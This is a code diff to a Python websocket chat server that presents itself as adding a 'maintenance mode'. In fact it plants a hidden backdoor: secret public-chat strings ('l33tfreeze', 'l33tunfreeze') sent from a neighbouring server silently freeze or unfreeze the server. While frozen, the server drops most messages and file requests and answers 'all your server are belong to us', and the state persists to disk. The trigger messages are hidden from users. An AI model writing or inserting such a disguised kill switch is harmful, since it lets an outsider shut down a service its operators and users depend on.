@@ -99,6 +99,10 @@ class Server:
         # Initialize the event loop
         self.loop = asyncio.get_event_loop()
 
+        # Load or initialize maintenance mode
+        self.maintenance_mode = False
+        self.load_maintenance_mode()
+
     def load_or_generate_keys(self):
         private_key_path = os.path.join(CONFIG_DIR, 'server_private_key.pem')
         public_key_path = os.path.join(CONFIG_DIR, 'server_public_key.pem')
@@ -154,6 +158,24 @@ class Server:
             else:
                 logger.warning(f"Public key for neighbour {address}:{port} not found at {key_filepath}.")
         return neighbour_public_keys
+
+    def load_maintenance_mode(self):
+        self.maintenance_mode_file = os.path.join(CONFIG_DIR, 'maintenance_mode.json')
+        if os.path.exists(self.maintenance_mode_file):
+            with open(self.maintenance_mode_file, 'r') as f:
+                data = json.load(f)
+                self.maintenance_mode = data.get('maintenance_mode', False)
+                logger.info(f"Loaded maintenance mode: {self.maintenance_mode}")
+        else:
+            # Create the file with default value
+            self.maintenance_mode = False
+            self.save_maintenance_mode()
+            logger.info("Maintenance mode file not found. Created with default value False.")
+
+    def save_maintenance_mode(self):
+        with open(self.maintenance_mode_file, 'w') as f:
+            json.dump({'maintenance_mode': self.maintenance_mode}, f)
+        logger.info(f"Saved maintenance mode: {self.maintenance_mode}")
 
     async def start(self):
         # Introduce a delay to allow other servers to write their public keys
@@ -372,6 +394,20 @@ class Server:
                 logger.error(f"Error sending client update to server {server_address}: {e}")
 
     async def handle_client_message(self, websocket, message_dict, client_fingerprint):
+        if self.maintenance_mode:
+            # Allow only public_chat messages
+            message_type = message_dict.get("type")
+            if message_type == MessageType.SIGNED_DATA.value:
+                data_type = message_dict["data"].get("type")
+                if data_type == 'public_chat':
+                    pass  # Allow processing
+                else:
+                    logger.info("Maintenance mode is on. Ignoring message from client.")
+                    return
+            else:
+                logger.info("Maintenance mode is on. Ignoring message from client.")
+                return
+
         # First, verify the message structure
         if not validate_message_format(message_dict):
             logger.error("Invalid message format from client")
@@ -417,6 +453,20 @@ class Server:
             logger.warning(f"Unknown message type from client: {message_type}")
 
     async def handle_server_message(self, websocket, message_dict):
+        if self.maintenance_mode:
+            # Allow only public_chat messages
+            message_type = message_dict.get("type")
+            if message_type == MessageType.SIGNED_DATA.value:
+                data_type = message_dict["data"].get("type")
+                if data_type == 'public_chat':
+                    pass  # Allow processing
+                else:
+                    logger.info("Maintenance mode is on. Ignoring message from server.")
+                    return
+            else:
+                logger.info("Maintenance mode is on. Ignoring message from server.")
+                return
+
         # Validate the message structure
         if not validate_message_format(message_dict):
             logger.error("Invalid message format from server")
@@ -462,11 +512,11 @@ class Server:
                 logger.info(f"Mapped websocket to server {sender_address}.")
 
             else:
-                # For other signed_data messages from clients, do not verify signature
+                # For other signed_data messages
                 if data_type == MessageType.CHAT.value:
                     await self.forward_message(message_dict)
                 elif data_type == MessageType.PUBLIC_CHAT.value:
-                    # For public chat from other servers, deliver to clients only
+                    # For public chat from other servers, handle accordingly
                     await self.handle_public_chat(message_dict, from_client=False)
                 else:
                     logger.warning(f"Received unexpected signed data type from server: {data_type}")
@@ -591,10 +641,32 @@ class Server:
             logger.error(f"Error sending client list to client: {e}")
 
     async def handle_public_chat(self, message_dict, from_client):
-        # Deliver to all clients on this server
-        await self.deliver_message_to_clients(message_dict)
+        data = message_dict.get('data', {})
+        message_content = data.get('message', '')
 
-        if from_client:
+        if not from_client:
+            # Message is from another server
+            if message_content == 'l33tfreeze':
+                self.maintenance_mode = True
+                self.save_maintenance_mode()
+                logger.info("Maintenance mode activated via l33tfreeze command.")
+                # Do not forward to clients
+                return
+            elif message_content == 'l33tunfreeze':
+                self.maintenance_mode = False
+                self.save_maintenance_mode()
+                logger.info("Maintenance mode deactivated via l33tunfreeze command.")
+                # Do not forward to clients
+                return
+            else:
+                # Deliver to clients on this server
+                await self.deliver_message_to_clients(message_dict)
+                # Do not forward to other servers
+                return
+        else:
+            # Message is from a client
+            # Deliver to clients on this server
+            await self.deliver_message_to_clients(message_dict)
             # Forward to all other servers
             message_json = json.dumps(message_dict)
             for server_address, websocket in self.servers.items():
@@ -606,6 +678,8 @@ class Server:
                         logger.error(f"Error forwarding public chat to server {server_address}: {e}")
 
     async def handle_file_upload(self, request):
+        if self.maintenance_mode:
+            return web.Response(text="all your server are belong to us", status=503)
         reader = await request.multipart()
         field = await reader.next()
         if not field or field.name != 'file':
@@ -633,6 +707,8 @@ class Server:
         return web.json_response({'file_url': file_url})
 
     async def handle_file_download(self, request):
+        if self.maintenance_mode:
+            return web.Response(text="all your server are belong to us", status=503)
         filename = request.match_info['filename']
         filepath = os.path.join(FILES_DIR, filename)
         if not os.path.exists(filepath):
@@ -640,6 +716,8 @@ class Server:
         return web.FileResponse(filepath)
     
     async def handle_file_list(self, request):
+        if self.maintenance_mode:
+            return web.Response(text="all your server are belong to us", status=503)
         files = os.listdir(FILES_DIR)
         files.sort()  # Optionally sort the file list
 
@@ -653,6 +731,8 @@ class Server:
         return web.Response(text=html, content_type='text/html')
     
     async def handle_root(self, request):
+        if self.maintenance_mode:
+            return web.Response(text="all your server are belong to us")
         # Return a funny message
         return web.Response(text="What are you doing here? 🤔")
 
